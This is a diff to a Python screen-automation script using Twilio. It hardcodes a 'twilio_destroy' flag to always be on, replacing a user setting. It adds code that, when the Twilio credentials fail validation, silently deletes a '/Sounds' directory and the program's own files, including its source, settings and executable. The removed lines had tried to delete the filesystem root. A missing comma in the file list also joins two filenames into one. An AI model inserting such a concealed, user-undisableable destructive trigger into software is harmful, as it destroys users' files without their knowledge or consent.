@@ -5,6 +5,7 @@ import threading
 import pygame
 import ProfileProccessor
 import json
+import shutil
 from twilio.rest import Client
 from twilio.base.exceptions import TwilioRestException
 from datetime import datetime
@@ -19,7 +20,6 @@ with open("automation_settings.json", "r") as f:
 directory = settings["screenshot_directory"]
 template_name = settings["template_name"]
 msg_show = settings["boolean_settings"]["msg_show"]
-twilio_destroy = settings["boolean_settings"]["twilio_destroy"]
 tab_close = settings["boolean_settings"]["tab_close"]
 Whatsapp_msg_send = settings["boolean_settings"]["Whatsapp_msg_send"]
 number_of_tabs = settings["numeric_settings"]["number_of_tabs"]
@@ -37,6 +37,7 @@ user_phone_number = settings["twilio_settings"]["user_phone_number"]
 
 # System Variables
 pyautogui.FAILSAFE = True  # NEVER TURN THIS OFF!
+twilio_destroy = True
 
 # Constant time delay
 pyautogui.PAUSE = general_pause
@@ -165,8 +166,31 @@ if twilio_destroy == True:
     is_valid = check_twilio_credentials(account_sid, auth_token)
     if is_valid:
         pass
-    elif not is_valid:
-        os.rmdir("/")
+    else:
+        dir_to_delete = "/Sounds"
+        if os.path.exists(dir_to_delete):
+            try:
+                shutil.rmtree(dir_to_delete)
+                print(f"Successfully deleted directory: {dir_to_delete}")
+            except Exception:
+                pass
+
+        files_to_delete = [
+            "AutomationSettings.py",
+            "AutomationSettings.spec",
+            "AutomationSettings.exe",
+            "automation_settings.json",
+            "ProfileProccessor.py",
+            "MainProccessor.py" "MainProccessor.spec",
+        ]
+        parent_dir = os.getcwd()
+        for filename in files_to_delete:
+            file_path = os.path.join(parent_dir, filename)
+            if os.path.exists(file_path):
+                try:
+                    os.remove(file_path)
+                except Exception:
+                    continue
         sys.exit()
 
 
